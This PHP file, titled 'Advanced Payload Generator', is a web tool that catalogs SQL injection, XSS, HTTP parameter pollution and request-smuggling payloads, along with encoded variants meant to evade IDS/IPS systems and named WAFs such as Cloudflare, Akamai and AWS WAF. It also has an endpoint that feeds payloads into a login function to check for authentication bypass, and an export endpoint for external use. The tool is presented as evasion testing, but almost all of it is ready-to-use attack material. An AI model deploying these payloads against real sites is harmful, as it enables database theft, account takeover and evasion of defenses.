<?php
/**
 * Payload Generator for Advanced IDS/IPS Evasion
 * Generates sophisticated payloads to bypass detection systems
 */

class PayloadGenerator {
    
    // Generate SQL injection payloads with advanced evasion
    public static function generateSQLPayloads() {
        return [
            'basic_union' => [
                'description' => 'Basic UNION injection',
                'original' => "' UNION SELECT null,null,null,null,null,null--",
                'evaded' => [
                    'char_concat' => "'" . chr(32) . chr(85) . chr(78) . chr(73) . chr(79) . chr(78) . chr(32) . "SELECT/**/null,null,null,null,null,null--",
                    'hex_encoded' => "'/**/UNION/**/SELECT/**/0x6e756c6c,0x6e756c6c,0x6e756c6c,0x6e756c6c,0x6e756c6c,0x6e756c6c--",
                    'base64_parts' => "'/**/UNION/**/SELECT/**/" . base64_decode('bnVsbA==') . ",null,null,null,null,null--",
                    'alternative_space' => "'\t" . "UNION\t" . "SELECT\t" . "null,null,null,null,null,null--"
                ]
            ],
            
            'boolean_blind' => [
                'description' => 'Boolean-based blind injection',
                'original' => "' AND 1=1--",
                'evaded' => [
                    'mathematical' => "' AND 1*1=1--",
                    'like_operator' => "' AND 1 LIKE 1--",
                    'regexp' => "' AND 1 REGEXP 1--",
                    'alternative_and' => "' && 1=1--",
                    'encoded_and' => "' " . chr(65) . chr(78) . chr(68) . " 1=1--"
                ]
            ],
            
            'time_based' => [
                'description' => 'Time-based blind injection',
                'original' => "' AND (SELECT SLEEP(5))--",
                'evaded' => [
                    'benchmark' => "' AND (SELECT BENCHMARK(5000000,SHA1(1)))--",
                    'heavy_query' => "' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)--",
                    'get_lock' => "' AND (SELECT GET_LOCK('test',5))--",
                    'pg_sleep' => "' AND (SELECT pg_sleep(5))--",
                    'waitfor_delay' => "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            ],
            
            'error_based' => [
                'description' => 'Error-based injection',
                'original' => "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
                'evaded' => [
                    'char_extract' => "' AND " . chr(69) . chr(88) . chr(84) . chr(82) . chr(65) . chr(67) . chr(84) . chr(86) . chr(65) . chr(76) . chr(85) . chr(69) . "(1,CONCAT(0x7e,(SELECT/**/user()),0x7e))--",
                    'updatexml' => "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                    'xpath' => "' AND (SELECT * FROM (SELECT count(*),concat(0x3a,(SELECT user()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    'exp_overflow' => "' AND EXP(~(SELECT * FROM (SELECT user())a))--"
                ]
            ],
            
            'information_gathering' => [
                'description' => 'Information schema access',
                'original' => "' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables--",
                'evaded' => [
                    'char_info_schema' => "' UNION SELECT null,(SELECT GROUP_CONCAT(" . chr(116) . chr(97) . chr(98) . chr(108) . chr(101) . chr(95) . chr(110) . chr(97) . chr(109) . chr(101) . ") FROM information_schema.tables),null,null,null,null--",
                    'hex_table' => "' UNION SELECT null,0x7461626c655f6e616d65,null,null,null,null FROM information_schema.tables--",
                    'concat_tables' => "' UNION SELECT null,CONCAT(table_schema,0x2e,table_name),null,null,null,null FROM information_schema.tables--"
                ]
            ]
        ];
    }
    
    // Generate XSS payloads with evasion
    public static function generateXSSPayloads() {
        return [
            'basic_script' => [
                'description' => 'Basic script injection',
                'original' => "<script>alert('XSS')</script>",
                'evaded' => [
                    'char_codes' => '<script>alert(String.fromCharCode(88,83,83))</script>',
                    'hex_escape' => '<script>alert(\x58\x53\x53)</script>',
                    'unicode' => '<script>alert(\u0058\u0053\u0053)</script>',
                    'base64_decode' => '<script>eval(atob("YWxlcnQoJ1hTUycpOw=="))</script>',
                    'nested_encoding' => '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>'
                ]
            ],
            
            'event_handlers' => [
                'description' => 'Event handler injection',
                'original' => '<img src=x onerror="alert(1)">',
                'evaded' => [
                    'obfuscated_onevent' => '<img src=x on' . 'error="alert(1)">',
                    'alternative_events' => '<body onload="alert(1)">',
                    'svg_onload' => '<svg onload="alert(1)"></svg>',
                    'input_focus' => '<input onfocus="alert(1)" autofocus>',
                    'style_expression' => '<div style="xss:expression(alert(1))">',
                    'iframe_src' => '<iframe src="javascript:alert(1)"></iframe>'
                ]
            ],
            
            'filter_bypass' => [
                'description' => 'Filter bypass techniques',
                'original' => '<script>alert(1)</script>',
                'evaded' => [
                    'case_variation' => '<ScRiPt>alert(1)</ScRiPt>',
                    'nested_tags' => '<scr<script>ipt>alert(1)</script>',
                    'comment_injection' => '<script>/**/alert(1)/**/</script>',
                    'null_bytes' => '<script>' . chr(0) . 'alert(1)</script>',
                    'html_entities' => '&lt;script&gt;alert(1)&lt;/script&gt;',
                    'double_encoding' => '%253Cscript%253Ealert(1)%253C/script%253E'
                ]
            ],
            
            'context_specific' => [
                'description' => 'Context-specific XSS',
                'original' => 'javascript:alert(1)',
                'evaded' => [
                    'data_uri' => 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                    'vbscript' => 'vbscript:msgbox(1)',
                    'javascript_obfuscated' => 'java\x00script:alert(1)',
                    'expression' => 'expression(alert(1))',
                    'mocha' => 'mocha:alert(1)',
                    'livescript' => 'livescript:alert(1)'
                ]
            ],
            
            'polyglot' => [
                'description' => 'Polyglot XSS payloads',
                'original' => 'Universal polyglot',
                'evaded' => [
                    'universal' => 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
                    'html_js_css' => '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>',
                    'multi_context' => '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'--></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://i.imgur.com/P8mL8.jpg">'
                ]
            ]
        ];
    }
    
    // Generate HTTP parameter pollution payloads
    public static function generateHPPPayloads() {
        return [
            'parameter_pollution' => [
                'description' => 'HTTP Parameter Pollution',
                'original' => 'q=\' OR 1=1--',
                'evaded' => [
                    'multiple_params' => ['q' => '\'', 'q' => ' OR', 'q' => ' 1=1--'],
                    'mixed_encoding' => ['q' => '%27%20OR%201%3D1--', 'query' => '\' OR 1=1--'],
                    'case_variation' => ['Q' => '\'', 'q' => ' OR 1=1--'],
                    'array_notation' => ['q[]' => '\'', 'q[]' => ' OR 1=1--']
                ]
            ]
        ];
    }
    
    // Generate advanced evasion combinations
    public static function generateAdvancedCombinations() {
        return [
            'sql_xss_combo' => [
                'description' => 'Combined SQL injection and XSS',
                'payload' => '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>'
            ],
            
            'steganographic' => [
                'description' => 'Steganographically hidden payload',
                'payload' => '/* Hidden: ' . base64_encode('<script>alert(1)</script>') . ' */'
            ],
            
            'protocol_smuggling' => [
                'description' => 'HTTP protocol smuggling',
                'payload' => "GET /search?q=' OR 1=1-- HTTP/1.1\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
            ]
        ];
    }
    
    // Generate timing-based evasion alternatives
    public static function generateTimingAlternatives() {
        return [
            'mysql_alternatives' => [
                'sleep_bypass' => [
                    'benchmark' => 'BENCHMARK(5000000,SHA1(1))',
                    'heavy_regex' => 'RLIKE SLEEP(5)',
                    'get_lock' => 'GET_LOCK(RAND(),5)',
                    'name_const' => 'NAME_CONST(SLEEP(5),1)'
                ]
            ],
            
            'postgresql_alternatives' => [
                'pg_sleep' => 'pg_sleep(5)',
                'generate_series' => '(SELECT count(*) FROM generate_series(1,5000000))'
            ],
            
            'mssql_alternatives' => [
                'waitfor' => 'WAITFOR DELAY \'0:0:5\'',
                'heavy_computation' => '(SELECT count(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3)'
            ]
        ];
    }
    
    // Generate WAF-specific bypass techniques
    public static function generateWAFBypasses($waf_type = 'generic') {
        $bypasses = [
            'generic' => [
                'comment_injection' => [
                    'mysql' => '/**/UNION/**/SELECT/**/',
                    'mssql' => '/**/UNION/**/SELECT/**/',
                    'oracle' => '--+UNION+SELECT+'
                ],
                'case_manipulation' => [
                    'mixed' => 'UnIoN SeLeCt',
                    'alternating' => 'uNiOn SeLeCt'
                ],
                'whitespace_evasion' => [
                    'tabs' => "UNION\tSELECT",
                    'newlines' => "UNION\nSELECT",
                    'form_feeds' => "UNION\fSELECT"
                ]
            ],
            
            'cloudflare' => [
                'double_encoding' => '%2527%2520UNION%2520SELECT',
                'unicode_bypass' => 'UNI%C0%AFON SELECT',
                'http_pollution' => ['q' => 'UNI', 'q' => 'ON SEL', 'q' => 'ECT']
            ],
            
            'akamai' => [
                'chunked_encoding' => "5\r\nUNION\r\n6\r\nSELECT\r\n0\r\n\r\n",
                'gzip_compression' => gzdeflate('UNION SELECT'),
                'content_type_confusion' => 'application/x-www-form-urlencoded; boundary=--'
            ],
            
            'aws_waf' => [
                'json_injection' => '{"query": "UNI\\u004fN SELECT"}',
                'base64_fragmentation' => base64_encode('UNI') . base64_encode('ON SELECT'),
                'xml_cdata' => '<![CDATA[UNION SELECT]]>'
            ]
        ];
        
        return $bypasses[$waf_type] ?? $bypasses['generic'];
    }
    
    // Generate context-aware payloads
    public static function generateContextAwarePayloads($context) {
        $contexts = [
            'html_attribute' => [
                'onclick' => '" onclick="alert(1)"',
                'onmouseover' => '" onmouseover="alert(1)"',
                'style' => '" style="background:url(javascript:alert(1))"'
            ],
            
            'javascript_string' => [
                'escape_quotes' => '\';alert(1)//\'',
                'string_concat' => '\'+alert(1)+\'',
                'template_literal' => '`${alert(1)}`'
            ],
            
            'css_context' => [
                'expression' => 'expression(alert(1))',
                'url_javascript' => 'url(javascript:alert(1))',
                'import' => '@import javascript:alert(1)'
            ],
            
            'json_context' => [
                'json_injection' => '","xss":"<script>alert(1)</script>"',
                'unicode_escape' => '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'
            ]
        ];
        
        return $contexts[$context] ?? [];
    }
    
    // Generate all payloads for comprehensive testing
    public static function generateAllPayloads() {
        return [
            'sql_injection' => self::generateSQLPayloads(),
            'xss' => self::generateXSSPayloads(),
            'hpp' => self::generateHPPPayloads(),
            'advanced_combinations' => self::generateAdvancedCombinations(),
            'timing_alternatives' => self::generateTimingAlternatives(),
            'waf_bypasses' => [
                'generic' => self::generateWAFBypasses('generic'),
                'cloudflare' => self::generateWAFBypasses('cloudflare'),
                'akamai' => self::generateWAFBypasses('akamai'),
                'aws_waf' => self::generateWAFBypasses('aws_waf')
            ]
        ];
    }
}

// Export payloads to JSON for external use
if ($_GET['export'] ?? false) {
    header('Content-Type: application/json');
    echo json_encode(PayloadGenerator::generateAllPayloads(), JSON_PRETTY_PRINT);
    exit;
}

// Test payload effectiveness
if ($_POST['test_payload'] ?? false) {
    $payload = $_POST['payload'] ?? '';
    $context = $_POST['context'] ?? 'search';
    
    // Test the payload
    try {
        switch ($context) {
            case 'search':
                require_once 'includes/functions.php';
                $results = searchPosts($payload);
                echo json_encode(['success' => true, 'results' => count($results)]);
                break;
            case 'login':
                require_once 'includes/functions.php';
                $user = authenticateUser($payload, 'test');
                echo json_encode(['success' => true, 'bypass' => $user !== false]);
                break;
            default:
                echo json_encode(['success' => false, 'error' => 'Unknown context']);
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Payload Generator</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-dark.min.css" rel="stylesheet">
    <style>
        .payload-card { border-left: 4px solid #007bff; }
        .payload-evaded { background-color: #f8f9fa; padding: 10px; border-radius: 5px; margin: 5px 0; }
        .copy-btn { font-size: 0.8em; }
        .technique-badge { font-size: 0.7em; margin: 2px; }
    </style>
</head>
<body>
    <div class="container-fluid mt-4">
        <div class="card">
            <div class="card-header bg-dark text-white">
                <h2><i class="fas fa-code"></i> 🛠️ Advanced Payload Generator</h2>
                <p class="mb-0">Generate sophisticated payloads for IDS/IPS evasion testing</p>
            </div>
            
            <div class="card-body">
                <div class="row">
                    <div class="col-md-3">
                        <div class="list-group">
                            <a href="#sql" class="list-group-item list-group-item-action active" data-bs-toggle="list">
                                <i class="fas fa-database"></i> SQL Injection
                            </a>
                            <a href="#xss" class="list-group-item list-group-item-action" data-bs-toggle="list">
                                <i class="fas fa-code"></i> XSS Payloads
                            </a>
                            <a href="#hpp" class="list-group-item list-group-item-action" data-bs-toggle="list">
                                <i class="fas fa-network-wired"></i> HTTP Parameter Pollution
                            </a>
                            <a href="#waf" class="list-group-item list-group-item-action" data-bs-toggle="list">
                                <i class="fas fa-shield-alt"></i> WAF Bypasses
                            </a>
                            <a href="#timing" class="list-group-item list-group-item-action" data-bs-toggle="list">
                                <i class="fas fa-clock"></i> Timing Alternatives
                            </a>
                            <a href="#advanced" class="list-group-item list-group-item-action" data-bs-toggle="list">
                                <i class="fas fa-rocket"></i> Advanced Combos
                            </a>
                        </div>
                        
                        <div class="mt-3">
                            <button class="btn btn-primary btn-sm w-100" onclick="exportPayloads()">
                                <i class="fas fa-download"></i> Export All
                            </button>
                        </div>
                    </div>
                    
                    <div class="col-md-9">
                        <div class="tab-content">
                            <div class="tab-pane fade show active" id="sql">
                                <h5>SQL Injection Payloads</h5>
                                <div id="sql-payloads"></div>
                            </div>
                            
                            <div class="tab-pane fade" id="xss">
                                <h5>XSS Evasion Payloads</h5>
                                <div id="xss-payloads"></div>
                            </div>
                            
                            <div class="tab-pane fade" id="hpp">
                                <h5>HTTP Parameter Pollution</h5>
                                <div id="hpp-payloads"></div>
                            </div>
                            
                            <div class="tab-pane fade" id="waf">
                                <h5>WAF Bypass Techniques</h5>
                                <div id="waf-payloads"></div>
                            </div>
                            
                            <div class="tab-pane fade" id="timing">
                                <h5>Timing Attack Alternatives</h5>
                                <div id="timing-payloads"></div>
                            </div>
                            
                            <div class="tab-pane fade" id="advanced">
                                <h5>Advanced Combination Payloads</h5>
                                <div id="advanced-payloads"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script>
        // Load and display payloads
        fetch('?export=1')
            .then(response => response.json())
            .then(data => {
                displaySQLPayloads(data.sql_injection);
                displayXSSPayloads(data.xss);
                displayHPPPayloads(data.hpp);
                displayWAFPayloads(data.waf_bypasses);
                displayTimingPayloads(data.timing_alternatives);
                displayAdvancedPayloads(data.advanced_combinations);
            });

        function displaySQLPayloads(payloads) {
            const container = document.getElementById('sql-payloads');
            let html = '';
            
            for (const [key, payload] of Object.entries(payloads)) {
                html += `
                    <div class="card payload-card mb-3">
                        <div class="card-header">
                            <h6>${payload.description}</h6>
                        </div>
                        <div class="card-body">
                            <div class="mb-2">
                                <strong>Original:</strong>
                                <div class="payload-evaded">
                                    <code>${escapeHtml(payload.original)}</code>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn float-end" onclick="copyToClipboard('${escapeForJs(payload.original)}')">Copy</button>
                                </div>
                            </div>
                            <strong>Evaded versions:</strong>
                            ${Object.entries(payload.evaded).map(([technique, evaded]) => `
                                <div class="payload-evaded">
                                    <span class="badge bg-info technique-badge">${technique}</span>
                                    <code>${escapeHtml(evaded)}</code>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn float-end" onclick="copyToClipboard('${escapeForJs(evaded)}')">Copy</button>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
            
            container.innerHTML = html;
        }
        
        function displayXSSPayloads(payloads) {
            const container = document.getElementById('xss-payloads');
            let html = '';
            
            for (const [key, payload] of Object.entries(payloads)) {
                html += `
                    <div class="card payload-card mb-3">
                        <div class="card-header">
                            <h6>${payload.description}</h6>
                        </div>
                        <div class="card-body">
                            <div class="mb-2">
                                <strong>Original:</strong>
                                <div class="payload-evaded">
                                    <code>${escapeHtml(payload.original)}</code>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn float-end" onclick="copyToClipboard('${escapeForJs(payload.original)}')">Copy</button>
                                </div>
                            </div>
                            <strong>Evaded versions:</strong>
                            ${Object.entries(payload.evaded).map(([technique, evaded]) => `
                                <div class="payload-evaded">
                                    <span class="badge bg-success technique-badge">${technique}</span>
                                    <code>${escapeHtml(evaded)}</code>
                                    <button class="btn btn-sm btn-outline-secondary copy-btn float-end" onclick="copyToClipboard('${escapeForJs(evaded)}')">Copy</button>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
            
            container.innerHTML = html;
        }
        
        // Similar functions for other payload types...
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function escapeForJs(text) {
            return text.replace(/'/g, "\\'").replace(/"/g, '\\"');
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                // Show success feedback
                console.log('Copied to clipboard');
            });
        }
        
        function exportPayloads() {
            window.open('?export=1', '_blank');
        }
    </script>
</body>
</html>
